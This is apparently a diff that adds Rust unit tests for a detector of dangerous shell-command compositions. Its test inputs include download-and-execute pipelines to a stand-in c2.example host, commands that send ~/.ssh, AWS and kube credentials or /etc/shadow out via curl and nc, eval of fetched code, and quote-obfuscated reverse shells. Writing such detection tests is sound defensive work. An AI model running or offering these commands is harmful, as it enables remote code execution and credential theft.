     }
+
+    fn kinds(content: &str) -> Vec<CompositionKind> {
+        find_compositions(content)
+            .into_iter()
+            .map(|finding| finding.kind)
+            .collect()
+    }
+
+    #[test]
+    fn download_execute_crosses_intermediate_stages() {
+        for content in [
+            "curl -s https://c2.example/p | base64 -d | bash",
+            "wget -qO- https://c2.example/p | gunzip | sh",
+            "curl -s u | tr a-z n-za-m | python3",
+            "curl -s u | sudo bash",
+            "curl -s u | zsh",
+            "curl -s u | base64 -d | bash -s -- --flag",
+            "curl -s u | base64 -d | sh -e",
+            "curl -s u | base64 -d | bash --norc",
+            "curl -s u |\n  base64 -d |\n  bash",
+            "cu\"\"rl -s u | base64 -d | ba''sh",
+            "x=$(curl -s u | base64 -d | bash)",
+            "x=\"$(curl -s u | base64 -d | bash)\"",
+            "x=`curl -s u | base64 -d | bash`",
+            "bash -c 'curl -s u | base64 -d | sh'",
+            "bash <<EOF\ncurl -s u | base64 -d | sh\nEOF",
+        ] {
+            assert!(
+                kinds(content).contains(&CompositionKind::DownloadExecute),
+                "missed: {content}"
+            );
+        }
+    }
+
+    #[test]
+    fn plain_and_regex_evading_download_pipes() {
+        for content in [
+            "curl -s https://x | bash",
+            "wget -qO- https://x | sh",
+            "curl -s u |& bash",
+            "curl -s \"https://x/?a|b\" | bash",
+        ] {
+            assert_eq!(kinds(content), vec![CompositionKind::DownloadExecute], "{content}");
+        }
+    }
+
+    #[test]
+    fn interpreter_option_values_are_not_script_operands() {
+        for interpreter in [
+            "bash -euo pipefail",
+            "bash -o pipefail",
+            "bash +x",
+            "bash -O extglob",
+            "python3 -E",
+            "python3 -W ignore",
+            "python3 -Wignore",
+            "perl -Mstrict",
+            "perl -w",
+            "ruby -E utf-8",
+            "node -r ./hook.js",
+            "bash /dev/fd/0",
+            "bash -- /dev/stdin",
+            "source /dev/stdin",
+            ". /dev/stdin",
+            "nice bash",
+            "nice -n 10 bash",
+            "timeout 60 sh",
+            "timeout -s KILL 60 sh",
+            "setsid bash",
+            "busybox sh",
+            "stdbuf -oL bash",
+            "ionice -c3 bash",
+        ] {
+            let content = format!("curl -s u | base64 -d | {interpreter}");
+            assert!(
+                kinds(&content).contains(&CompositionKind::DownloadExecute),
+                "missed: {content}"
+            );
+        }
+        for interpreter in [
+            "bash -ec 'cat > x'",
+            "bash -o pipefail -c 'cat > x'",
+            "python3 -W ignore -c 'import sys'",
+            "perl -Mstrict -e 'print <STDIN>'",
+            "ruby -E utf-8 -e 'p 1'",
+            "php -r 'echo 1;'",
+            "bash ./configure.sh",
+            "source ./env.sh",
+            "timeout 60 sha256sum",
+        ] {
+            let content = format!("curl -s u | base64 -d | {interpreter}");
+            assert!(
+                !kinds(&content).contains(&CompositionKind::DownloadExecute),
+                "false positive: {content}"
+            );
+        }
+    }
+
+    #[test]
+    fn unquoted_heredoc_bodies_expand_substitutions() {
+        assert!(
+            kinds("cat <<EOF\n$(curl -s u | base64 -d | bash)\nEOF")
+                .contains(&CompositionKind::DownloadExecute)
+        );
+        assert!(kinds("cat <<'EOF'\n$(curl -s u | base64 -d | bash)\nEOF").is_empty());
+        assert!(kinds("cat <<\\EOF\n$(curl -s u | base64 -d | bash)\nEOF").is_empty());
+    }
+
+    #[test]
+    fn download_pipelines_without_stdin_interpreter_are_not_compositions() {
+        for content in [
+            "curl -s https://api.example/releases | awk '{print $4}'",
+            "curl -s https://api.example/releases | jq -r .tag_name",
+            "curl -sL https://x/a.tar.gz | tar xz",
+            "curl -s https://x | python -c 'import json,sys; print(json.load(sys.stdin))'",
+            "curl -s https://x | python3 -m json.tool",
+            "curl -s https://x | node -e 'process.stdin.pipe(process.stdout)'",
+            "curl -s https://x | sha256sum",
+            "curl -s https://x > script.sh; bash -n script.sh",
+            "echo 'curl -s u | base64 -d | bash'",
+            "# curl -s u | base64 -d | bash",
+            "cat > notes <<EOF\ncurl -s u | base64 -d | bash\nEOF",
+            "x='$(curl -s u | base64 -d | bash)'",
+            "pkgver() { curl -s u | base64 -d > out; bash out.sh; }",
+            "base64 -d payload.b64 > icon.png",
+            "echo $((1 + 2)) | bash -c 'read x; echo $x'",
+        ] {
+            assert!(
+                kinds(content).is_empty(),
+                "false positive: {content} -> {:?}",
+                kinds(content)
+            );
+        }
+    }
+
+    #[test]
+    fn decode_execute_requires_an_encoding_decoder() {
+        assert_eq!(
+            kinds("echo aGVsbG8K | base64 -d | sh"),
+            vec![CompositionKind::DecodeExecute]
+        );
+        assert_eq!(
+            kinds("base64 --decode <<< \"$blob\" | bash"),
+            vec![CompositionKind::DecodeExecute]
+        );
+        assert_eq!(
+            kinds("xxd -r -p data.hex | bash"),
+            vec![CompositionKind::DecodeExecute]
+        );
+        assert!(kinds("zcat completion.gz | sed s/x/y/").is_empty());
+    }
+
+    #[test]
+    fn credential_exfiltration_through_pipes_and_xargs() {
+        for content in [
+            "tar czf - /root/.ssh /root/.aws 2>/dev/null | base64 -w0 | xargs -I{} curl -s -d {} https://c2.example/collect || true",
+            "cat ~/.ssh/id_rsa | curl -X POST -d @- https://c2.example",
+            "x=$(cat ~/.aws/credentials | curl -d @- https://c2.example)",
+            "curl -F \"f=@$HOME/.aws/credentials\" https://c2.example",
+            "curl -d @- https://c2.example < ~/.kube/config",
+            "cat /etc/shadow | nc c2.example 4444",
+        ] {
+            assert!(
+                kinds(content).contains(&CompositionKind::CredentialExfiltration),
+                "missed: {content}"
+            );
+        }
+        assert!(kinds("install -Dm600 ssh_config \"$pkgdir/etc/ssh/ssh_config\"").is_empty());
+        assert!(kinds("cat ~/.ssh/config | grep Host").is_empty());
+    }
+
+    #[test]
+    fn executed_substitutions_that_fetch_or_decode() {
+        for content in [
+            "eval \"$(curl -fsSL https://c2.example/stage1)\"",
+            "eval `wget -qO- https://c2.example`",
+            "eval \"$(echo aGk= | base64 -d)\"",
+            "bash -c \"$(curl -fsSL https://c2.example)\"",
+            "sh <<< \"$(curl -s https://c2.example)\"",
+            "bash <(curl -s https://c2.example)",
+            "bash < <(curl -s https://c2.example)",
+            "source <(curl -s https://c2.example | base64 -d)",
+        ] {
+            assert!(
+                kinds(content).contains(&CompositionKind::SubstitutionExecute),
+                "missed: {content}"
+            );
+        }
+        for content in [
+            "eval \"$pkgver\"",
+            "eval \"$(dircolors -b)\"",
+            "x=\"$(curl -s https://api/version)\"",
+            "source <(./configure --print-env)",
+        ] {
+            assert!(
+                !kinds(content).contains(&CompositionKind::SubstitutionExecute),
+                "false positive: {content}"
+            );
+        }
+    }
+
+    #[test]
+    fn braces_attached_to_words_are_not_separators() {
+        let tokens = tokenize("xargs -I{} curl -d {} ${HOME}/x");
+        assert!(!tokens.iter().any(|token| matches!(token, Token::Separator)));
+        let grouped = tokenize("true; { echo a; }");
+        assert!(!grouped.iter().any(
+            |token| matches!(token, Token::Word(word) if word.value == "{" || word.value == "}")
+        ));
+    }
+
+    #[test]
+    fn joins_only_prose_free_quote_fragments() {
+        assert_eq!(
+            join_quoted_fragments("ba\"\"sh -i >& /dev/t''cp/1.2.3.4/4444 0>&1"),
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+        );
+        assert_eq!(
+            join_quoted_fragments("n\"\"c -e /bin/sh h 1"),
+            "nc -e /bin/sh h 1"
+        );
+        assert_eq!(join_quoted_fragments("c\\url x"), "curl x");
+        assert_eq!(
+            join_quoted_fragments("echo \"run curl x | sh\""),
+            "echo \"run curl x | sh\""
+        );
+        let multi = "a=\"x\ny\"\nb";
+        assert_eq!(
+            join_quoted_fragments(multi).lines().count(),
+            multi.lines().count()
+        );
+    }
 }
+
